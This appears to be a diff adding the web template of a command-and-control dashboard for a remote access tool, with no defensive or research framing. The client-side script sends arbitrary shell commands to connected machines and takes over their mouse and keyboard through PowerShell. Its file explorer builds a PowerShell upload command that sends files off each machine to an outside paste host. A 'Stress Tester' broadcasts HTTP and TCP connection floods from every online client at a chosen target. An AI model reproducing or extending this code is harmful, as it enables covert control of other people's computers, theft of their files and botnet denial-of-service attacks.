@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Dashboard</title>
+    <style>
+        body, html { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background-color: #1a1a1a; color: #e0e0e0; }
+        body { display: flex; flex-direction: column; min-height: 100vh; }
+        nav { background-color: #222; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+        nav a { color: #ccc; text-decoration: none; margin-right: 1rem; transition: color 0.3s;}
+        nav a:hover { color: #fff; }
+        .container { display: flex; flex-grow: 1; padding: 2rem; gap: 2rem; }
+
+        .client-list { flex: 0 0 250px; padding: 1rem; background-color: #282828; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); overflow-y: auto; max-height: calc(100vh - 4rem - 3rem); }
+        .client-list h2 { margin-top:0; margin-bottom: 1rem; border-bottom: 1px solid #333; padding-bottom: .5rem; }
+
+        .client {
+            padding: 10px; border-radius: 4px; cursor: pointer; transition: all 0.2s ease;
+            margin-bottom: 10px; display: flex; flex-direction: column; align-items: flex-start;
+            border: 1px solid #444;
+        }
+
+        .client.offline { background-color: #2a2a2a; border-color: #333; opacity: 0.6; cursor: not-allowed; }
+        .client.online { background-color: #2d3a2d; border-left: 5px solid #4CAF50; }
+        .client.selected { background-color: #f1c40f !important; color: #000 !important; border-color: #d4ac0d; }
+
+        .client-header { display: flex; width: 100%; justify-content: space-between; align-items: center; }
+        .client-alias { font-weight: bold; font-size: 1rem; }
+
+        .client-desc {
+            font-size: 0.8rem; color: #bbb; margin-top: 4px;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+            max-width: 180px; transition: all 0.3s ease;
+        }
+        .client:hover .client-desc { white-space: normal; overflow: visible; max-width: 100%; color: #fff; }
+        .client.selected .client-desc { color: #333; }
+
+        .client-screenshot-preview { width: 40px; height: 25px; border-radius: 2px; overflow: hidden; background: #000; }
+        .client-screenshot-preview img { width: 100%; height: 100%; object-fit: cover; }
+
+        .main-content-area { flex: 1; display: flex; flex-direction: column; gap: 2rem; overflow-y: auto; max-height: calc(100vh - 4rem - 3rem); }
+        .command-area, .stress-test-area, .file-explorer-area { padding: 1rem; background-color: #282828; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); display: none; flex-direction: column; }
+        .command-area h2, .stress-test-area h2, .file-explorer-area h2 { margin-top:0; margin-bottom: 1rem; border-bottom: 1px solid #333; padding-bottom: .5rem; }
+
+        .metadata-editor { background: #333; padding: 12px; border-radius: 6px; margin-bottom: 15px; border: 1px solid #444; }
+        .metadata-editor label { font-size: 0.8rem; color: #f1c40f; display: block; margin-bottom: 4px; }
+        .metadata-editor input, .metadata-editor textarea {
+            width: 100%; background: #1a1a1a; color: white; border: 1px solid #555;
+            padding: 8px; margin-bottom: 8px; border-radius: 4px; box-sizing: border-box;
+        }
+
+        #command-input { width: 100%; padding: 0.8rem; margin-bottom: 1rem; background-color: #333; color: #fff; border: none; border-radius: 4px; box-sizing: border-box; }
+        #command-output { border: 1px solid #333; min-height: 100px; max-height: 250px; padding: 1rem; border-radius: 4px; overflow-y: auto; background-color: #333; margin-bottom: 1rem; white-space: pre-wrap; font-family: monospace; font-size: 0.9rem; }
+        #screenshot-area { display: none; margin-top: 1rem;}
+        #screenshot-area img { max-width: 100%; border: 1px solid #333; border-radius: 4px; }
+
+        button { background-color: #5cb85c; color: #fff; border: none; padding: 0.8rem 1.5rem; border-radius: 4px; cursor: pointer; transition: background-color 0.3s; margin-right: 0.5rem; margin-bottom: 0.5rem;}
+        button:hover { background-color: #4cae4c; }
+
+        .macro-btn { background-color: #444; border: 1px solid #666; font-size: 0.85rem; padding: 0.5rem 1rem; position: relative; }
+        .macro-btn:hover { background-color: #555; }
+        .macro-delete { position: absolute; top: -5px; right: -5px; background: #e74c3c; border-radius: 50%; width: 18px; height: 18px; line-height: 14px; text-align: center; font-size: 12px; cursor: pointer; }
+        .macro-container { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; border-top: 1px solid #444; padding-top: 15px; }
+
+        #file-list-container { max-height: 400px; overflow-y: auto; background: #1a1a1a; border: 1px solid #333; border-radius: 4px; margin-top: 10px; }
+        .file-item { padding: 8px 12px; border-bottom: 1px solid #333; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        .file-item:hover { background: #222; }
+        .file-info { display: flex; align-items: center; gap: 10px; }
+        .file-name { font-family: monospace; }
+        .file-type-icon { color: #f1c40f; }
+        .file-actions button { padding: 4px 8px; font-size: 0.75rem; margin: 0; }
+
+        #control-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; cursor: crosshair; }
+        #control-image { max-width: 95%; max-height: 85%; border: 2px solid #f1c40f; }
+        #control-status { color: #f1c40f; margin-top: 15px; font-size: 1.2rem; font-weight: bold; font-family: monospace; }
+
+        footer { text-align: center; padding: 1rem 0; background-color: #222; margin-top: auto;}
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="/dashboard" style="font-weight: bold; color: white;">C2 Dashboard</a>
+        <a href="/logout">Logout</a>
+    </nav>
+
+    <div id="control-overlay">
+        <img id="control-image" src="" alt="Remote Control Stream">
+        <div id="control-status">REMOTE CONTROL ACTIVE - ESC TO EXIT</div>
+    </div>
+
+    <div class="container">
+        <div class="client-list">
+            <h2>Clients:</h2>
+            <ul id="clients" style="list-style-type: none; padding: 0;"></ul>
+        </div>
+
+        <div class="main-content-area">
+            <div class="command-area" id="command-area">
+                <h2>Control: <span id="selected-client-name">None</span> <small id="conn-status-indicator" style="font-size: 0.8rem; margin-left: 10px;"></small></h2>
+
+                <div class="metadata-editor">
+                    <label>Alias</label>
+                    <input type="text" id="edit-alias">
+                    <label>Description</label>
+                    <textarea id="edit-desc" rows="2"></textarea>
+                    <button onclick="saveMetadata()" style="background-color: #f1c40f; color: black; font-weight: bold;">Save Identity</button>
+                </div>
+
+                <div class="controls">
+                    <input type="text" id="command-input" placeholder="Type a shell command..." onkeydown="if(event.key === 'Enter') sendCommand();">
+                    <div style="display: flex; flex-wrap: wrap;">
+                        <button onclick="sendCommand()">Execute</button>
+                        <button onclick="enterControlMode()" style="background-color: #e67e22;">Remote Desktop</button>
+                        <button onclick="toggleFileExplorer()" style="background-color: #3498db;">File Explorer</button>
+                        <button onclick="toggleStressTester()" style="background-color: #e74c3c;">Stress Tester</button>
+                    </div>
+                </div>
+
+                <div id="macro-section">
+                    <div style="display: flex; gap: 5px; margin-top: 10px;">
+                        <input type="text" id="new-macro-name" placeholder="Macro Name" style="flex:1; padding: 5px; background:#333; color:white; border:1px solid #555;">
+                        <input type="text" id="new-macro-cmd" placeholder="Command" style="flex:2; padding: 5px; background:#333; color:white; border:1px solid #555;">
+                        <button onclick="addMacro()" style="background-color: #9b59b6; margin:0; padding: 5px 15px;">Add Macro</button>
+                    </div>
+                    <div class="macro-container" id="macro-container"></div>
+                </div>
+
+                <div id="command-output"></div>
+
+                <div id="screenshot-area">
+                    <img id="screenshot-image" src="" alt="Client Screenshot">
+                </div>
+            </div>
+
+            <div class="stress-test-area" id="stress-test-area">
+                <h2>Network Stress Tester (Broadcast)</h2>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
+                    <div>
+                        <label style="font-size: 0.8rem; color: #bbb;">Target Host</label>
+                        <input type="text" id="stress-host" placeholder="1.1.1.1" style="width:100%; background:#333; color:white; border:none; padding:8px; border-radius:4px;">
+                    </div>
+                    <div>
+                        <label style="font-size: 0.8rem; color: #bbb;">Target Port</label>
+                        <input type="number" id="stress-port" value="80" style="width:100%; background:#333; color:white; border:none; padding:8px; border-radius:4px;">
+                    </div>
+                    <div>
+                        <label style="font-size: 0.8rem; color: #bbb;">Method</label>
+                        <select id="stress-method" style="width:100%; background:#333; color:white; border:none; padding:8px; border-radius:4px;">
+                            <option value="ping">ICMP Ping</option>
+                            <option value="http_get">HTTP GET Flood</option>
+                            <option value="tcp_conn">TCP Connection Flood</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label style="font-size: 0.8rem; color: #bbb;">Iterations per client</label>
+                        <input type="number" id="stress-count" value="100" style="width:100%; background:#333; color:white; border:none; padding:8px; border-radius:4px;">
+                    </div>
+                </div>
+                <button onclick="launchStressTest()" style="background-color: #c0392b; width: 100%;">LAUNCH BROADCAST</button>
+            </div>
+
+            <div class="file-explorer-area" id="file-explorer-area">
+                <div style="display: flex; justify-content: space-between;">
+                    <h2>File Explorer</h2>
+                    <button onclick="refreshFiles()" style="background-color: #2ecc71;">Refresh</button>
+                </div>
+                <div id="current-path-display" style="font-family: monospace; background: #000; padding: 5px; border-radius: 4px; margin-bottom: 10px; color: #4CAF50;">C:\</div>
+                <div id="file-list-container"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
+    <script>
+        {% raw %}
+        const socket = io('/api');
+        let current_client_id = null;
+        let current_client_hostname = null;
+        let allConnectedClients = [];
+        let isControlMode = false;
+        let commandHistory = {};
+        let clientStates = {};
+
+        const DIR_JSON_MARKER = '##DIR_JSON##';
+        const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';
+
+        socket.on('connect', () => { socket.emit('join_dashboard'); });
+
+        socket.on('macro_list', (macros) => {
+            const container = document.getElementById('macro-container');
+            container.innerHTML = '';
+            macros.forEach(m => {
+                const btnWrap = document.createElement('div');
+                btnWrap.style.position = 'relative';
+                const btn = document.createElement('button');
+                btn.className = 'macro-btn';
+                btn.textContent = m.name;
+                btn.onclick = () => { if(current_client_id) socket.emit('command', { 'command': m.command, 'client_id': current_client_id }); };
+                const del = document.createElement('div');
+                del.className = 'macro-delete';
+                del.innerHTML = '&times;';
+                del.onclick = (e) => { e.stopPropagation(); socket.emit('delete_macro', {id: m.id}); };
+                btnWrap.appendChild(btn);
+                btnWrap.appendChild(del);
+                container.appendChild(btnWrap);
+            });
+        });
+
+        function addMacro() {
+            const name = document.getElementById('new-macro-name').value;
+            const command = document.getElementById('new-macro-cmd').value;
+            if(name && command) {
+                socket.emit('add_macro', {name, command});
+                document.getElementById('new-macro-name').value = '';
+                document.getElementById('new-macro-cmd').value = '';
+            }
+        }
+
+        socket.on('client_list', (clients) => {
+            allConnectedClients = clients;
+            const list = document.getElementById('clients');
+            list.innerHTML = '';
+
+            if (current_client_hostname) {
+                const activeMatch = clients.find(c => c.hostname === current_client_hostname && c.online);
+                const statusIndicator = document.getElementById('conn-status-indicator');
+                if (activeMatch) {
+                    if (current_client_id !== activeMatch.id) {
+                        current_client_id = activeMatch.id;
+                        if (isControlMode) socket.emit('command', { 'command': '#scrsht 100', 'client_id': current_client_id });
+                        if (document.getElementById('file-explorer-area').style.display === 'flex') refreshFiles();
+                    }
+                    statusIndicator.textContent = "(CONNECTED)";
+                    statusIndicator.style.color = "#4CAF50";
+                } else {
+                    statusIndicator.textContent = "(RECONNECTING...)";
+                    statusIndicator.style.color = "#e74c3c";
+                }
+            }
+
+            clients.sort((a, b) => (a.online === b.online) ? 0 : a.online ? -1 : 1);
+            clients.forEach(client => {
+                const li = document.createElement('li');
+                li.className = `client ${client.online ? 'online' : 'offline'} ${(current_client_hostname === client.hostname) ? 'selected' : ''}`;
+                li.innerHTML = `<div class="client-header"><span class="client-alias">${client.alias || client.hostname}</span><div class="client-screenshot-preview"><img src="data:image/jpeg;base64,${client.screenshot_data}"></div></div><div class="client-desc">${client.description || 'No description'}</div>`;
+                if (client.online) {
+                    li.onclick = () => {
+                        current_client_id = client.id;
+                        current_client_hostname = client.hostname;
+                        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\" };
+                        document.getElementById('command-area').style.display = 'flex';
+                        document.getElementById('selected-client-name').textContent = client.alias || client.hostname;
+                        document.getElementById('edit-alias').value = client.alias || '';
+                        document.getElementById('edit-desc').value = client.description || '';
+                        document.getElementById('screenshot-area').style.display = 'block';
+                        document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
+                        const outputDiv = document.getElementById('command-output');
+                        outputDiv.textContent = commandHistory[current_client_hostname] || "";
+                        outputDiv.scrollTop = outputDiv.scrollHeight;
+                        if (document.getElementById('file-explorer-area').style.display === 'flex') refreshFiles();
+                        socket.emit('join_dashboard');
+                    };
+                }
+                list.appendChild(li);
+            });
+        });
+
+        function saveMetadata() {
+            socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value });
+        }
+
+        function sendCommand() {
+            const input = document.getElementById('command-input');
+            if (current_client_id && input.value.trim()) {
+                socket.emit('command', { 'command': input.value, 'client_id': current_client_id });
+                input.value = '';
+            }
+        }
+
+        socket.on('command_output', (data) => {
+            if (data.output.includes(DIR_JSON_MARKER)) {
+                const jsonPart = data.output.substring(data.output.indexOf(DIR_JSON_MARKER) + DIR_JSON_MARKER.length);
+                renderFileSystem(jsonPart);
+                return;
+            }
+
+            // Fixed Link Parsing Logic
+            const mbRegex = /https:\/\/microbin\.elaptic\.dev\/p\/[a-zA-Z0-9]+/g;
+            const matches = data.output.match(mbRegex);
+            if (matches) matches.forEach(link => window.open(link, '_blank'));
+
+            const targetClient = allConnectedClients.find(c => c.id === data.client_id);
+            if (targetClient) {
+                if (!commandHistory[targetClient.hostname]) commandHistory[targetClient.hostname] = "";
+                commandHistory[targetClient.hostname] += data.output;
+            }
+            if (data.client_id !== current_client_id) return;
+            const outputDiv = document.getElementById('command-output');
+            outputDiv.appendChild(document.createTextNode(data.output));
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        });
+
+        function toggleFileExplorer() {
+            const exp = document.getElementById('file-explorer-area');
+            if (exp.style.display !== 'flex') { exp.style.display = 'flex'; refreshFiles(); } else { exp.style.display = 'none'; }
+        }
+
+        function refreshFiles() {
+            if (!current_client_id || !current_client_hostname || !clientStates[current_client_hostname]) return;
+            const path = clientStates[current_client_hostname].currentPath;
+            const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${DIR_JSON_MARKER}' (ConvertTo-Json -InputObject $items) } else { echo '${DIR_JSON_MARKER} []' }"`;
+            socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
+        }
+
+        function renderFileSystem(jsonStr) {
+            const container = document.getElementById('file-list-container');
+            const pathDisplay = document.getElementById('current-path-display');
+            if (!current_client_hostname || !clientStates[current_client_hostname]) return;
+            let currentPath = clientStates[current_client_hostname].currentPath;
+            pathDisplay.textContent = currentPath;
+            container.innerHTML = '';
+            const back = document.createElement('div');
+            back.className = 'file-item';
+            back.innerHTML = `<div class="file-info"><span class="file-type-icon">📁</span> <span class="file-name">.. [Parent Directory]</span></div>`;
+            back.onclick = () => {
+                const parts = currentPath.split('\\').filter(p => p.length > 0);
+                if (parts.length > 1) { parts.pop(); clientStates[current_client_hostname].currentPath = parts.join('\\') + '\\'; refreshFiles(); } else { clientStates[current_client_hostname].currentPath = "C:\\"; refreshFiles(); }
+            };
+            container.appendChild(back);
+            try {
+                let items = JSON.parse(jsonStr.trim() || "[]");
+                if (!Array.isArray(items)) items = items ? [items] : [];
+                items.forEach(item => {
+                    if (!item || !item.Name) return;
+                    const el = document.createElement('div');
+                    el.className = 'file-item';
+                    const icon = item.IsDirectory ? '📁' : '📄';
+                    const size = item.IsDirectory ? '' : `<span style="color:#666; font-size:0.7rem;">(${(item.Size / 1024).toFixed(1)} KB)</span>`;
+                    el.innerHTML = `<div class="file-info"><span class="file-type-icon">${icon}</span> <span class="file-name">${item.Name}</span> ${size}</div><div class="file-actions">${!item.IsDirectory ? `<button onclick="downloadFile('${item.Name.replace(/'/g, "\\'")}', event)">Get</button>` : ''}</div>`;
+                    el.onclick = () => {
+                        if (item.IsDirectory) {
+                            const current = clientStates[current_client_hostname].currentPath;
+                            clientStates[current_client_hostname].currentPath = current.endsWith('\\') ? current + item.Name + '\\' : current + '\\' + item.Name + '\\';
+                            refreshFiles();
+                        }
+                    };
+                    container.appendChild(el);
+                });
+            } catch (e) { container.innerHTML = `<div style="padding:10px; color:#e74c3c;">Path unavailable.</div>`; }
+        }
+
+        function downloadFile(name, event) {
+            event.stopPropagation();
+            if (!current_client_hostname || !clientStates[current_client_hostname]) return;
+            const path = clientStates[current_client_hostname].currentPath;
+            const fullPath = (path + name).replace(/'/g, "''");
+            const cleanBaseUrl = MICROBIN_URL_BASE.replace(/\/+$/, '');
+
+            // Fixed Upload Script Logic
+            const uploadCmd = `powershell -Command "$filePath='${fullPath}'; $URL='${cleanBaseUrl}/upload'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray(); if($response -match 'id=\\"download-link\\".*?href=\\"([^\\"]+)\\"') { $link = $Matches[1]; echo ('${cleanBaseUrl}' + $link) } else { echo 'Regex failed to find download link in response body.' }"`;
+
+            socket.emit('command', { 'command': uploadCmd, 'client_id': current_client_id });
+        }
+
+        function launchStressTest() {
+            const host = document.getElementById('stress-host').value;
+            const port = document.getElementById('stress-port').value;
+            const method = document.getElementById('stress-method').value;
+            const count = document.getElementById('stress-count').value;
+            let cmd = (method === 'ping') ? `ping -n ${count} ${host}` : (method === 'http_get') ? `powershell -Command "1..${count} | ForEach { iwr -Uri http://${host}:${port} -UseBasicParsing }"` : `powershell -Command "1..${count} | ForEach { $t = New-Object Net.Sockets.TcpClient; $t.Connect('${host}', ${port}); $t.Close() }"`;
+            allConnectedClients.filter(c => c.online).forEach(client => { socket.emit('command', { 'command': cmd, 'client_id': client.id }); });
+        }
+
+        socket.on('screenshot_data', (data) => {
+            if (data.client_id === current_client_id) {
+                document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + data.image_data;
+                if (isControlMode) document.getElementById('control-image').src = "data:image/jpeg;base64," + data.image_data;
+            }
+        });
+
+        function enterControlMode() {
+            if (!current_client_id) return;
+            isControlMode = true;
+            document.getElementById('control-overlay').style.display = 'flex';
+            socket.emit('command', { 'command': '#scrsht 100', 'client_id': current_client_id });
+            const img = document.getElementById('control-image');
+            img.onclick = (e) => {
+                const rect = img.getBoundingClientRect();
+                const x = Math.floor((e.clientX - rect.left) / rect.width * 65535);
+                const y = Math.floor((e.clientY - rect.top) / rect.height * 65535);
+                const clickCmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $old = [System.Windows.Forms.Cursor]::Position; $sig = '[DllImport(\\"user32.dll\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, uint e);'; $type = Add-Type -MemberDefinition $sig -Name \\"Win32Utils\\" -Namespace \\"Win32Utils\\" -PassThru; $type::mouse_event(0x8001, ${x}, ${y}, 0, 0); $type::mouse_event(0x0002, 0, 0, 0, 0); $type::mouse_event(0x0004, 0, 0, 0, 0); [System.Windows.Forms.Cursor]::Position = $old;"`;
+                socket.emit('command', { 'command': clickCmd.replace(/\s+/g, ' ').trim(), 'client_id': current_client_id });
+            };
+            window.addEventListener('keydown', handleKey);
+        }
+
+        function handleKey(e) {
+            if (e.key === 'Escape') { isControlMode = false; document.getElementById('control-overlay').style.display = 'none'; socket.emit('command', { 'command': '#scrsht reset', 'client_id': current_client_id }); window.removeEventListener('keydown', handleKey); return; }
+            if (isControlMode) {
+                e.preventDefault();
+                let key = e.key;
+                const mapping = { "ArrowUp": "{UP}", "ArrowDown": "{DOWN}", "ArrowLeft": "{LEFT}", "ArrowRight": "{RIGHT}", "Enter": "{ENTER}", "Backspace": "{BACKSPACE}", "Tab": "{TAB}", "Escape": "{ESC}" };
+                if (mapping[key]) key = mapping[key]; else if (key.length > 1) key = `{${key.toUpperCase()}}`;
+                const keyCmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${key.replace(/'/g, "''")}')"`;
+                socket.emit('command', { 'command': keyCmd, 'client_id': current_client_id });
+            }
+        }
+
+        function toggleStressTester() { const area = document.getElementById('stress-test-area'); area.style.display = (area.style.display === 'flex') ? 'none' : 'flex'; }
+        {% endraw %}
+    </script>
+</body>
+</html>
